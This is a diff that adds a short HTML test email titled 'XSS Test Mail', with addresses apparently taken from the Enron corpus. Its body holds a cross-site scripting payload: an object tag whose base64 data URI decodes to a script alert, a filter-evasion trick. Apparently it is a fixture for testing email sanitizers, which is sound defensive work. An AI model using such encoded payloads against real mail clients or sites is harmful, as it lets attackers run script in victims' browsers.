@@ -1,0 +1,7 @@
+From: "Johnson, Elizabeth" <ejohnson@jhsph.edu>
+To: steven.harris@enron.com, tony.pryor@enron.com, glen.hass@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==">
